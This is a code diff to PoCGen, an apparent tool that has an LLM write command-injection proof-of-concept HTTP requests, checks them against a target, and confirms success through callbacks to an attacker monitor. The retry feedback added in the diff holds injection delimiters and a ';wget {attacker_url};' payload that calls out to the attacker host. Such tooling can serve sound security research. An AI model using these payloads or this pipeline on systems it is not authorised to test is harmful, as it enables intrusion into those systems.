@@ -1,14 +1,16 @@
 from __future__ import annotations
 from typing import Dict, List, Optional, Type
+from datetime import datetime
 
 from rich.console import Console
+from pathlib import Path
 
 from PoCGen.config.config import SETTINGS
 from PoCGen.llm.client import ChatMessage, LLMClient
 from PoCGen.prompts.templates import build_prompt_command_injection_http
 from PoCGen.core.sampler import sample_target_with_playwright
 from PoCGen.core.target_profile import TargetSample
-from PoCGen.core.attacker_monitor import AttackerMonitor
+from PoCGen.core.attacker_monitor import AttackerMonitor, monitor_available, wait_for_external_monitor
 from PoCGen.core.remote_validator import validate_http_requests
 from .models import (
     AttemptResult,
@@ -83,6 +85,27 @@ def generate_poc(
     handler = get_handler(vuln_type)
     atk_url = attacker_url or SETTINGS.attacker_url
 
+    # Chat logging: one log file per task
+    chat_log_dir = Path(__file__).resolve().parent.parent / "logs" / "chat"
+    chat_log_dir.mkdir(parents=True, exist_ok=True)
+    chat_log_path = chat_log_dir / f"chat_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
+
+    def log_chat(text: str) -> None:
+        try:
+            ts = datetime.now().isoformat(timespec="seconds")
+            with open(chat_log_path, "a", encoding="utf-8") as fh:
+                fh.write(f"[{ts}] {text}\n")
+        except Exception:
+            pass
+
+    log_chat(
+        "Initial input:\n"
+        f"description: {description}\n"
+        f"target: {target or '<none>'}\n"
+        f"vuln_type: {vuln_type or SETTINGS.default_vuln_type}\n"
+        f"attacker_url: {atk_url}"
+    )
+
     max_iters = max(1, max_iterations or SETTINGS.max_iterations)
     if not auto_validate:
         max_iters = 1
@@ -98,13 +121,28 @@ def generate_poc(
     last_validation_results: Optional[List[ValidationResult]] = None
 
     monitor: Optional[AttackerMonitor] = None
+    external_monitor_url: Optional[str] = None
+    # Maintain a single LLM conversation for the full generation task; new task -> new conversation
+    conversation_messages: List[ChatMessage] = [ChatMessage(**m) for m in handler.build_messages(
+        description,
+        code_texts,
+        target,
+        atk_url,
+        None,
+        None,
+    )]
     monitor_running = False
     if auto_validate and atk_url:
-        monitor = AttackerMonitor(atk_url, timeout=monitor_wait)
-        monitor.start()
-        monitor_running = monitor.is_running()
-        if not monitor_running:
-            console.print("[yellow]Warning: attacker monitor failed to start; success detection will be disabled for this run")
+        if monitor_available(atk_url):
+            external_monitor_url = atk_url
+            monitor_running = True
+            console.print(f"[cyan]Reusing existing attacker monitor at {atk_url}")
+        else:
+            monitor = AttackerMonitor(atk_url, timeout=monitor_wait)
+            monitor.start()
+            monitor_running = monitor.is_running()
+            if not monitor_running:
+                console.print("[yellow]Warning: attacker monitor failed to start; success detection will be disabled for this run")
 
     try:
         target_profile_block: Optional[str] = None
@@ -133,21 +171,32 @@ def generate_poc(
         for attempt_index in range(max_iters):
             console.print(f"\n[bold]Attempt {attempt_index + 1}/{max_iters}[/bold]")
 
-            messages = handler.build_messages(
-                description,
-                code_texts,
-                target,
-                atk_url,
-                target_profile_block,
-                feedback_text,
+            log_chat(f"Attempt {attempt_index + 1} starting")
+            if feedback_text:
+                log_chat(f"Feedback provided to model:\n{feedback_text}")
+
+            # Build the prompt for this attempt by extending the existing conversation
+            messages: List[ChatMessage] = list(conversation_messages)
+            if target_profile_block:
+                messages.append(ChatMessage(role="user", content=f"Updated target profile:\n{target_profile_block}"))
+            if feedback_text:
+                messages.append(ChatMessage(role="user", content=f"Feedback from previous attempt:\n{feedback_text}"))
+
+            log_chat(
+                "Model input messages:\n" +
+                "\n".join(f"- {m.role}: {m.content}" for m in messages)
             )
 
             client = LLMClient()
             try:
-                cm = [ChatMessage(**m) for m in messages]
-                raw_output = client.chat(cm, temperature=temperature, max_tokens=max_tokens)
+                # LLM input: system/user messages sent for PoC generation
+                raw_output = client.chat(messages, temperature=temperature, max_tokens=max_tokens)
             finally:
                 client.close()
+
+            # Append assistant reply to conversation to preserve context across attempts in this task
+            conversation_messages.append(ChatMessage(role="assistant", content=raw_output))
+            log_chat("Model output:\n" + raw_output)
 
             raw_messages = split_messages(raw_output)
             if not raw_messages and raw_output.strip():
@@ -178,6 +227,7 @@ def generate_poc(
                     requests.append(HTTPMessage(method="", path="", version="", headers={}, body=raw))
 
             validation_results: Optional[List[ValidationResult]] = None
+            validation_error: Optional[str] = None
             if auto_validate and target and requests:
                 # If sampler captured cookies, inject them into requests lacking Cookie header to improve validation fidelity.
                 if sample_cookies_header:
@@ -193,18 +243,27 @@ def generate_poc(
                             )
                         else:
                             detail = res.error or (f"HTTP {res.status_code}" if res.status_code else "no response")
+                            preview = (res.response_preview or "").strip()
+                            if preview:
+                                preview = preview[:200] + ("..." if len(preview) > 200 else "")
+                                detail += f" | body: {preview}"
                             console.print(
                                 f"[yellow]Request #{res.request_index} validation failed ({detail})"
                             )
                 except Exception as exc:
                     console.print(f"[yellow]Warning: validation failed: {exc}")
                     validation_results = None
+                    validation_error = str(exc)
 
             monitor_hit = False
             monitor_summary: Optional[str] = None
             if monitor_running and requests:
-                monitor_hit = monitor.wait_for_hit(monitor_wait)
-                monitor_summary = monitor.last_request_summary
+                if external_monitor_url:
+                    monitor_hit, monitor_summary = wait_for_external_monitor(external_monitor_url, monitor_wait)
+                else:
+                    monitor_hit = monitor.wait_for_hit(monitor_wait)
+                    monitor_summary = monitor.last_request_summary
+
                 if monitor_hit:
                     console.print("[bold green]Attacker monitor recorded a callback![/bold green]")
                     if monitor_summary:
@@ -221,6 +280,7 @@ def generate_poc(
                     validation_results,
                     atk_url,
                     monitor_running,
+                    validation_error,
                 )
 
             attempts.append(
@@ -249,7 +309,7 @@ def generate_poc(
 
             if attempt_index + 1 < max_iters:
                 if feedback_text:
-                    console.print("[cyan]Prepared feedback for next attempt:[/cyan]\n" + feedback_text)
+                    console.print("[cyan]Prepared feedback for next attempt (feedback logged, not printed to console)")
                 elif not monitor_hit:
                     console.print("[yellow]No specific feedback generated; will request model to adjust strategy")
 
@@ -269,33 +329,47 @@ def _build_attempt_feedback(
     validation_results: Optional[List[ValidationResult]],
     attacker_url: str,
     monitor_active: bool,
+    validation_error: Optional[str] = None,
 ) -> Optional[str]:
     messages: List[str] = []
     if parse_issues:
         bullet = "\n".join(f"- {issue}" for issue in parse_issues)
         messages.append("Local HTTP parsing/validation issues detected:\n" + bullet)
 
+    validation_summaries: List[str] = []
     failed_validation: List[ValidationResult] = []
-    if validation_results:
-        failed: List[str] = []
+    if validation_results is not None:
         for res in validation_results:
-            if res.success:
-                continue
-            failed_validation.append(res)
-            reason = res.error
-            if not reason and res.status_code is not None:
-                reason = f"Target returned HTTP {res.status_code}"
-            if not reason:
-                reason = "Request failed without status code"
+            status = f"HTTP {res.status_code}" if res.status_code is not None else "no status"
+            url = res.url or "<no url>"
             preview = (res.response_preview or "").strip()
             if preview:
-                preview = preview[:200]
-                if len(res.response_preview) > 200:
-                    preview += "..."
-                reason += f". Response excerpt: {preview}"
-            failed.append(f"Request #{res.request_index}: {reason}")
-        if failed:
-            messages.append("Target validation reported issues:\n" + "\n".join(f"- {item}" for item in failed))
+                preview = preview[:200] + ("..." if len(preview) > 200 else "")
+            detail_parts: List[str] = []
+            if res.error:
+                detail_parts.append(res.error)
+            if preview:
+                detail_parts.append(f"body: {preview}")
+            detail = "; ".join(detail_parts)
+
+            if res.success:
+                line = f"Request #{res.request_index}: success -> {status} ({url})"
+            else:
+                failed_validation.append(res)
+                line = f"Request #{res.request_index}: failure -> {status} ({url})"
+                if not detail:
+                    detail = "no response"
+            if detail:
+                line += f"; {detail}"
+            validation_summaries.append(line)
+
+        if validation_summaries:
+            messages.append("Target validation summary:\n" + "\n".join(f"- {item}" for item in validation_summaries))
+
+    elif validation_error:
+        messages.append(f"Target validation did not run due to error: {validation_error}")
+    else:
+        messages.append("Target validation did not run or returned no results.")
 
     if monitor_active:
         messages.append(
@@ -310,10 +384,11 @@ def _build_attempt_feedback(
 
     if parse_issues or failed_validation:
         messages.append(
-            "Priority adjustment: rework the request BODY before tweaking headers. Mirror the handler's expected "
-            "form fields, parameter casing/order, and payload syntax so the vulnerable branch is actually reached. "
-            "Ensure the body encoding (JSON vs form-urlencoded vs raw text) matches the backend, and reuse the "
-            "injection delimiters it understands (e.g., '$(...)', '$(+ ...)', backticks, pipes)."
+            "Adjust along four tracks before the next attempt:\n"
+            "1) Encoding: rebuild the BODY to mirror required fields, parameter casing/order, and payload syntax; match the server's expected encoding (JSON vs form-urlencoded vs raw) and reuse its injection delimiters (e.g., '$(...)', '$(+ ...)', backticks, pipes).\n"
+            "2) Status/redirects: if 301/302, retry with the redirected path (e.g., '/path' -> '/path/'); if 401/403, refresh Cookie/credentials or follow the hinted auth flow; align Host/Origin/Referer with the target.\n"
+            "3) Method: if a POST with empty body fails, resend the same request as GET to handle endpoints that only read query params.\n"
+            "4) Payload: use a minimal, paired delimiter around the payload (e.g., ';wget {attacker_url};'), avoid extra quotes/backticks/brackets unless already present, and do NOT URL-encode separators; escape only what JSON requires."
         )
 
     return "\n\n".join(messages) if messages else None
